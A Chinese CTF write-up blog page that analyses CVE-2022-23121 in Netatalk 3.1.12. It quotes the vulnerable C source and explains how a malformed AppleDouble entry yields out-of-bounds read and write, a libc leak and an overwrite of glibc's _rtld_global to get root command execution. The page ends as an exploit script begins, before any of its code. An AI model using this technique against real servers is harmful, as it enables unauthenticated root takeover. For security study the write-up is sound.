<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
        
      <meta name="description" content="Boom? PWN ! ! !" />
      
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>AliyunCTF2024 Netatalk v3.1.12 越界读写利用 |  北极落小雪</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
  </html>
</html>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
    
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-AliyunCTF2024 Exploit Netatalk v3.1.12 by CVE-2022-23121"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  AliyunCTF2024 Netatalk v3.1.12 越界读写利用
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/AliyunCTF2024%20Exploit%20Netatalk%20v3.1.12%20by%20CVE-2022-23121/" class="article-date">
  <time datetime="2024-03-24T16:00:00.000Z" itemprop="datePublished">2024-03-25</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Pwn/">Pwn</a> / <a class="article-category-link" href="/categories/Pwn/%E5%BA%94%E7%94%A8%E5%B1%82/">应用层</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">3k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">15 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <p>House of AppleDouble(x<br>大部分时间用在理解AFP协议以及AD文件格式上了…</p>
<span id="more"></span>
<h2 id="CVE-2022-23121"><a href="#CVE-2022-23121" class="headerlink" title="CVE-2022-23121"></a>CVE-2022-23121</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>查看漏洞报告,提取出关键信息 <a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/advisories/ZDI-22-527/">https://www.zerodayinitiative.com/advisories/ZDI-22-527/</a></p>
<blockquote>
<p>This vulnerability allows remote attackers to execute arbitrary code on affected installations of Netatalk. Authentication is not required to exploit this vulnerability.<br>The specific flaw exists within the <code>parse_entries</code> function. The issue results from <code>the lack of proper error handling</code> when parsing AppleDouble entries. An attacker can leverage this vulnerability to execute code in the context of root.</p>
</blockquote>
<p>来到parse_entries函数,该函数从用户可控的AppleDouble buffer中获取eid,off,len字段,并存入ad的对应条目中.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Read an AppleDouble buffer, returns 0 on success, -1 if an entry was malformatted</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_entries</span><span class="params">(<span class="keyword">struct</span> adouble *ad, <span class="type">char</span> *buf, <span class="type">uint16_t</span> nentries)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span>   eid, len, off;</span><br><span class="line">    <span class="type">int</span>        ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, read in the entry bits */</span></span><br><span class="line">    <span class="keyword">for</span> (; nentries &gt; <span class="number">0</span>; nentries-- ) {</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;eid, buf, <span class="keyword">sizeof</span>( eid ));</span><br><span class="line">        eid = get_eid(ntohl(eid));</span><br><span class="line">        buf += <span class="keyword">sizeof</span>( eid );</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;off, buf, <span class="keyword">sizeof</span>( off ));</span><br><span class="line">        off = ntohl( off );</span><br><span class="line">        buf += <span class="keyword">sizeof</span>( off );</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;len, buf, <span class="keyword">sizeof</span>( len ));</span><br><span class="line">        len = ntohl( len );</span><br><span class="line">        buf += <span class="keyword">sizeof</span>( len );</span><br><span class="line"></span><br><span class="line">        ad-&gt;ad_eid[eid].ade_off = off;</span><br><span class="line">        ad-&gt;ad_eid[eid].ade_len = len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!eid</span><br><span class="line">            || eid &gt; ADEID_MAX</span><br><span class="line">            || off &gt;= <span class="keyword">sizeof</span>(ad-&gt;ad_data)</span><br><span class="line">            || ((eid != ADEID_RFORK) &amp;&amp; (off + len &gt;  <span class="keyword">sizeof</span>(ad-&gt;ad_data))))</span><br><span class="line">        {</span><br><span class="line">            ret = <span class="number">-1</span>;</span><br><span class="line">            LOG(log_warning, logtype_ad, <span class="string">"parse_entries: bogus eid: %u, off: %u, len: %u"</span>,</span><br><span class="line">                (uint)eid, (uint)off, (uint)len);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>看一下对off和len字段的check,</p>
<ul>
<li>off要小于AD_DATASZ_MAX(1024).</li>
<li>除ADEID_RFORK条目外,off+len要小于AD_DATASZ_MAX(1024).</li>
</ul>
<p>初步判断这里off+len有个整数溢出可以绕过checker,绕过的效果为将非法的len存入ad的条目中.但查找对ad_getentrylen的引用可以发现,非法的len并不能导致危险操作.</p>
<p>再回到off字段上,虽然有off &gt;= sizeof(ad-&gt;ad_data)的check,但checker实际有没有用需要看父函数对-1的返回值是怎么处理的.<br>接下来应该跟一下:</p>
<ol>
<li>父函数的错误处理.</li>
<li>off字段在哪里使用?</li>
</ol>
<p>对比一下三处调用</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ad_header_read</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> adouble *ad, <span class="type">const</span> <span class="keyword">struct</span> stat *hst)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">    <span class="comment">/* figure out all of the entry offsets and lengths. if we aren't</span></span><br><span class="line"><span class="comment">     * able to read a resource fork entry, bail. */</span></span><br><span class="line">    nentries = len / AD_ENTRY_LEN;</span><br><span class="line">    <span class="keyword">if</span> (parse_entries(ad, buf, nentries) != <span class="number">0</span>) {</span><br><span class="line">        LOG(log_warning, logtype_ad, <span class="string">"ad_header_read(%s): malformed AppleDouble"</span>,</span><br><span class="line">            path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line">        errno = EIO;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Read an ._ file, only uses the resofork, finderinfo is taken from EA */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ad_header_read_osx</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> adouble *ad, <span class="type">const</span> <span class="keyword">struct</span> stat *hst)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">    nentries = len / AD_ENTRY_LEN;</span><br><span class="line">    <span class="keyword">if</span> (parse_entries(&amp;adosx, buf, nentries) != <span class="number">0</span>) {</span><br><span class="line">        LOG(log_warning, logtype_ad, <span class="string">"ad_header_read(%s): malformed AppleDouble"</span>,</span><br><span class="line">            path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line">    }</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EC_FAIL do { ret = -1; goto cleanup; } while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ad_header_read_ea</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> adouble *ad, <span class="type">const</span> <span class="keyword">struct</span> stat *hst _U_)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">    <span class="comment">/* Now parse entries */</span></span><br><span class="line">    <span class="keyword">if</span> (parse_entries(ad, buf + AD_HEADER_LEN, nentries)) {</span><br><span class="line">        LOG(log_warning, logtype_ad, <span class="string">"ad_header_read(%s): malformed AppleDouble"</span>,</span><br><span class="line">            path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line">        errno = EINVAL;</span><br><span class="line">        EC_FAIL;</span><br><span class="line">    }</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>可以发现在ad_header_read_osx中的错误处理并不会立刻返回,而是继续处理.这才是真正存在漏洞的函数</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Read an ._ file, only uses the resofork, finderinfo is taken from EA */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ad_header_read_osx</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> adouble *ad, <span class="type">const</span> <span class="keyword">struct</span> stat *hst)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">    nentries = len / AD_ENTRY_LEN;</span><br><span class="line">    <span class="keyword">if</span> (parse_entries(&amp;adosx, buf, nentries) != <span class="number">0</span>) {</span><br><span class="line">        LOG(log_warning, logtype_ad, <span class="string">"ad_header_read(%s): malformed AppleDouble"</span>,</span><br><span class="line">            path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ad_getentrylen(&amp;adosx, ADEID_FINDERI) != ADEDLEN_FINDERI) {</span><br><span class="line">        LOG(log_warning, logtype_ad, <span class="string">"Convert OS X to Netatalk AppleDouble: %s"</span>,</span><br><span class="line">            path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (retry_read &gt; <span class="number">0</span>) {</span><br><span class="line">            LOG(log_error, logtype_ad, <span class="string">"ad_header_read_osx: %s, giving up"</span>, path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line">            errno = EIO;</span><br><span class="line">            EC_FAIL;</span><br><span class="line">        }</span><br><span class="line">        retry_read++;</span><br><span class="line">        <span class="keyword">if</span> (ad_convert_osx(path, &amp;adosx) == <span class="number">1</span>) {</span><br><span class="line">            <span class="keyword">goto</span> reread;</span><br><span class="line">        }</span><br><span class="line">        errno = EIO;</span><br><span class="line">        EC_FAIL;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ad_getentryoff(&amp;adosx, ADEID_RFORK) == <span class="number">0</span></span><br><span class="line">        || ad_getentryoff(&amp;adosx, ADEID_RFORK) &gt; <span class="keyword">sizeof</span>(ad-&gt;ad_data)</span><br><span class="line">        || ad_getentryoff(&amp;adosx, ADEID_RFORK) &gt; header_len</span><br><span class="line">        ) {</span><br><span class="line">        LOG(log_error, logtype_ad, <span class="string">"ad_header_read_osx: problem with rfork entry offset."</span>);</span><br><span class="line">        errno = EIO;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hst == <span class="literal">NULL</span>) {</span><br><span class="line">        hst = &amp;st;</span><br><span class="line">        EC_NEG1( fstat(ad_reso_fileno(ad), &amp;st) );</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    ad_setentryoff(ad, ADEID_RFORK, ad_getentryoff(&amp;adosx, ADEID_RFORK));</span><br><span class="line">    ad-&gt;ad_rlen = hst-&gt;st_size - ad_getentryoff(ad, ADEID_RFORK);</span><br><span class="line"></span><br><span class="line">EC_CLEANUP:</span><br><span class="line">    EC_EXIT;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>最终会在ad_convert_osx中使用非法的off字段.该函数截断AppleDouble中的FinderInfo条目到32字节.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Convert from Apple's ._ file to Netatalk</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Apple's AppleDouble may contain a FinderInfo entry longer then 32 bytes</span></span><br><span class="line"><span class="comment"> * containing packed xattrs. Netatalk can't deal with that, so we</span></span><br><span class="line"><span class="comment"> * simply discard the packed xattrs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * As we call ad_open() which might result in a recursion, just to be sure</span></span><br><span class="line"><span class="comment"> * use static variable in_conversion to check for that.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns -1 in case an error occured, 0 if no conversion was done, 1 otherwise</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ad_convert_osx</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> adouble *ad)</span></span><br><span class="line">{</span><br><span class="line">    EC_INIT;</span><br><span class="line">    <span class="type">static</span> <span class="type">bool</span> in_conversion = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">char</span> *<span class="built_in">map</span>;</span><br><span class="line">    <span class="type">int</span> finderlen = ad_getentrylen(ad, ADEID_FINDERI);</span><br><span class="line">    <span class="type">ssize_t</span> origlen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_conversion || finderlen == ADEDLEN_FINDERI)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    in_conversion = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    LOG(log_debug, logtype_ad, <span class="string">"Converting OS X AppleDouble %s, FinderInfo length: %d"</span>,</span><br><span class="line">        fullpathname(path), finderlen);</span><br><span class="line"></span><br><span class="line">    origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, origlen, PROT_READ | PROT_WRITE, MAP_SHARED, ad_reso_fileno(ad), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">map</span> == MAP_FAILED) {</span><br><span class="line">        LOG(log_error, logtype_ad, <span class="string">"mmap AppleDouble: %s\n"</span>, strerror(errno));</span><br><span class="line">        EC_FAIL;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    memmove(<span class="built_in">map</span> + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI,</span><br><span class="line">            <span class="built_in">map</span> + ad_getentryoff(ad, ADEID_RFORK),</span><br><span class="line">            ad_getentrylen(ad, ADEID_RFORK));</span><br><span class="line"></span><br><span class="line">    ad_setentrylen(ad, ADEID_FINDERI, ADEDLEN_FINDERI);</span><br><span class="line">    ad-&gt;ad_rlen = ad_getentrylen(ad, ADEID_RFORK);</span><br><span class="line">    ad_setentryoff(ad, ADEID_RFORK, ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI);</span><br><span class="line"></span><br><span class="line">    EC_ZERO_LOG( ftruncate(ad_reso_fileno(ad),</span><br><span class="line">                           ad_getentryoff(ad, ADEID_RFORK)</span><br><span class="line">                           + ad_getentrylen(ad, ADEID_RFORK)) );</span><br><span class="line"></span><br><span class="line">    (<span class="type">void</span>)ad_rebuild_adouble_header_osx(ad, <span class="built_in">map</span>);</span><br><span class="line">    munmap(<span class="built_in">map</span>, origlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a metadata EA if one doesn't exit */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(path) &lt; <span class="number">3</span>)</span><br><span class="line">        EC_EXIT_STATUS(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">adouble</span> <span class="title">adea</span>;</span></span><br><span class="line">    ad_init_old(&amp;adea, AD_VERSION_EA, ad-&gt;ad_options);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ad_open(&amp;adea, path + <span class="number">2</span>, ADFLAGS_HF | ADFLAGS_RDWR | ADFLAGS_CREATE, <span class="number">0666</span>) &lt; <span class="number">0</span>) {</span><br><span class="line">        LOG(log_error, logtype_ad, <span class="string">"create metadata: %s\n"</span>, strerror(errno));</span><br><span class="line">        EC_FAIL;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (adea.ad_mdp-&gt;adf_flags &amp; O_CREAT) {</span><br><span class="line">        <span class="built_in">memcpy</span>(ad_entry(&amp;adea, ADEID_FINDERI),</span><br><span class="line">               ad_entry(ad, ADEID_FINDERI),</span><br><span class="line">               ADEDLEN_FINDERI);</span><br><span class="line">        ad_flush(&amp;adea);</span><br><span class="line">    }</span><br><span class="line">    ad_close(&amp;adea, ADFLAGS_HF);</span><br><span class="line"></span><br><span class="line">EC_CLEANUP:</span><br><span class="line">    in_conversion = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>注意到这一句关键代码,以可控偏移和可控长度将可控内容向map写入.而map是通过mmap分配得到到与libc,ld之间的偏移固定,于是该原语可以完成libc和ld中的任意写入.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memmove(<span class="built_in">map</span> + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI,</span><br><span class="line">        <span class="built_in">map</span> + ad_getentryoff(ad, ADEID_RFORK),</span><br><span class="line">        ad_getentrylen(ad, ADEID_RFORK));</span><br></pre></td></tr></tbody></table></figure>


<p>虽然说该原语也能完成libc地址的泄露,不过更好的(<del>其实差不多</del>)越界读原语在ad_rebuild_adouble_header_osx中.<br>如下所示,这里的ad是一个栈上的局部变量,对它进行任意偏移读取32字节到adbuf中(即写入文件),再从文件中读取即可获取到栈上保存的__libc_start_main的地址.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ad_rebuild_adouble_header_osx</span><span class="params">(<span class="keyword">struct</span> adouble *ad, <span class="type">char</span> *adbuf)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">    <span class="built_in">memcpy</span>(adbuf + ADEDOFF_FINDERI_OSX, ad_entry(ad, ADEID_FINDERI), ADEDLEN_FINDERI);</span><br><span class="line">......</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403241957827.png"></p>
<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403250000707.png"></p>
<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403242016093.png"></p>
<p>在glibc2.27版本中,直接写入_rtld_global._dl_rtld_lock_recursive以及_rtld_global._dl_load_lock即可布置一次命令执行.(ps:写入时偏移过大会在ad_rebuild_adouble_header_osx中的memcpy崩溃,好在Netatalk有注册SIGSEGV的信号处理函数并最终abort,能成功触发”exit_hook”)</p>
<p>梳理一下利用的调用链:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ad_open</span><br><span class="line"> -&gt;adopen_rf</span><br><span class="line">  -&gt;ad_open_rf_ea</span><br><span class="line">   -&gt;ad_header_read_osx</span><br><span class="line">    -&gt;parse_entries</span><br><span class="line">    -&gt;ad_convert_osx</span><br><span class="line">     -&gt;ad_rebuild_adouble_header_osx</span><br></pre></td></tr></tbody></table></figure>


<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>由于笔者没有公网IP没法弹shell,利用服务的root权限将flag读出来后重新写入Shared卷中,再次建立连接正常读文件即可.</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span 